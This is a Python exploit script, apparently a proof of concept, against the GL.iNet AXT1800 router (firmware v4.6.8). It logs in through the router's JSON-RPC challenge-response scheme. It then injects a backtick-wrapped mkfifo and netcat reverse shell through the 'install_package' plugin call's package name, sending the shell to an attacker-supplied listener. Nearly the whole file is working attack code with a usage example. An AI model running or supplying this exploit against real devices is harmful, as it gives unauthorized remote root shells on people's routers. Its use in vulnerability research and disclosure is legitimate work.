#!/usr/bin/env python3
"""
GL.iNet AXT1800 Router Security Research Tool
Demonstrates command injection vulnerability on authenticated devices.

CVE: Pending
Affected: GL-AXT1800 Router v4.6.8
Author: Aleksa Zatezalo
Date: November 2025
"""

import argparse
import hashlib
import ipaddress
import sys
from typing import Tuple

import requests
from passlib.hash import md5_crypt, sha256_crypt, sha512_crypt

requests.packages.urllib3.disable_warnings()

# =============================================================================
# Core Functions
# =============================================================================

def create_session(host: str) -> Tuple[requests.Session, str]:
    """Initialize HTTP session and base URL."""
    session = requests.Session()
    base_url = f"http://{host}/rpc"
    return session, base_url

def build_rpc_request(method: str, params: dict, request_id: int = 1) -> dict:
    """Build JSON-RPC 2.0 request payload."""
    return {
        "jsonrpc": "2.0",
        "id": request_id,
        "method": method,
        "params": params
    }

def send_rpc(session: requests.Session, base_url: str, payload: dict) -> dict:
    """Send RPC request and return parsed response."""
    response = session.post(base_url, json=payload, timeout=10)
    response.raise_for_status()
    return response.json()

def request_challenge(session: requests.Session, base_url: str, username: str) -> dict:
    """Request authentication challenge from router."""
    payload = build_rpc_request("challenge", {"username": username})
    response = send_rpc(session, base_url, payload)
    
    if "error" in response:
        raise Exception(f"Challenge failed: {response['error']}")
    
    return response["result"]

def compute_auth_hash(username: str, password: str, challenge: dict) -> str:
    """Compute authentication hash using GL.iNet's algorithm."""
    salt = challenge["salt"]
    nonce = challenge["nonce"]
    alg = challenge["alg"]
    
    if alg == 1:
        pw = md5_crypt.using(salt=salt).hash(password)
    elif alg == 5:
        pw = sha256_crypt.using(salt=salt, rounds=5000).hash(password)
    elif alg == 6:
        pw = sha512_crypt.using(salt=salt, rounds=5000).hash(password)
    else:
        raise ValueError(f"Unsupported algorithm: {alg}")
    
    combined = f"{username}:{pw}:{nonce}"
    return hashlib.md5(combined.encode()).hexdigest()

def authenticate(host: str, username: str, password: str) -> str:
    """Authenticate and return session ID."""
    session, base_url = create_session(host)
    
    print(f"[*] Target: {host}")
    print(f"[*] Username: {username}")
    print("[*] Requesting challenge...")
    
    challenge = request_challenge(session, base_url, username)
    
    print(f"[*] Computing authentication hash...")
    auth_hash = compute_auth_hash(username, password, challenge)
    
    print("[*] Authenticating...")
    payload = build_rpc_request("login", {
        "username": username,
        "hash": auth_hash
    })
    
    response = send_rpc(session, base_url, payload)
    
    if "error" in response:
        raise Exception(f"Login failed: {response['error']}")
    
    if "result" in response and "sid" in response["result"]:
        sid = response["result"]["sid"]
        print(f"[+] Authenticated successfully")
        return sid
    else:
        raise Exception(f"Unexpected response: {response}")

def send_exploit(rhost: str, sid: str, lhost: str, lport: int) -> None:
    """Send command injection exploit."""
    payload = f'`mkfifo /tmp/p; /bin/sh -i < /tmp/p 2>&1 | nc {lhost} {lport} > /tmp/p`'
    
    url = f"http://{rhost}/rpc"
    headers = {
        'Content-Type': 'application/json',
        'Cookie': f'Admin-Token={sid}'
    }
    
    json_body = {
        "jsonrpc": "2.0",
        "id": 11,
        "method": "call",
        "params": [sid, "plugins", "install_package", {"name": [payload]}]
    }
    
    print(f"[*] Sending exploit to {rhost}")
    print(f"[*] Reverse shell: {lhost}:{lport}")
    
    try:
        response = requests.post(url, headers=headers, json=json_body, timeout=10)
        print(f"[+] Exploit sent - check your listener")
    except requests.exceptions.Timeout:
        print(f"[+] Timeout (expected) - check your listener")
    except Exception as e:
        print(f"[!] Error: {e}")

# =============================================================================
# CLI
# =============================================================================

def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description='GL-AXT1800 Command Injection Exploit (v4.6.8)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Example:
  %(prog)s --rhost 192.168.8.1 --lhost 10.0.0.1 --lport 4444 -p password

Note: For authorized security testing only.
        """
    )
    
    parser.add_argument('--rhost', required=True, help='Target router IP')
    parser.add_argument('--lhost', required=True, help='Listener IP')
    parser.add_argument('--lport', type=int, required=True, help='Listener port')
    parser.add_argument('-u', '--username', default='root', help='Username (default: root)')
    parser.add_argument('-p', '--password', required=True, help='Router password')
    
    return parser.parse_args()

# =============================================================================
# Main
# =============================================================================

def main():
    args = parse_arguments()
    
    try:
        # Validate inputs
        ipaddress.ip_address(args.rhost)
        ipaddress.ip_address(args.lhost)
        assert 1 <= args.lport <= 65535
        
        print("="*60)
        print("[*] GL-AXT1800 Command Injection Exploit")
        print("="*60 + "\n")
        
        # Authenticate
        sid = authenticate(args.rhost, args.username, args.password)
        
        # Exploit
        print("\n" + "="*60)
        print("[*] Executing Command Injection")
        print("="*60)
        send_exploit(args.rhost, sid, args.lhost, args.lport)
        
        print("\n" + "="*60)
        print("[+] Exploitation complete")
        print("="*60)
        
        return 0
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        return 130
    except Exception as e:
        print(f"\n[!] Error: {e}")
        return 1

if __name__ == "__main__":
    sys.exit(main())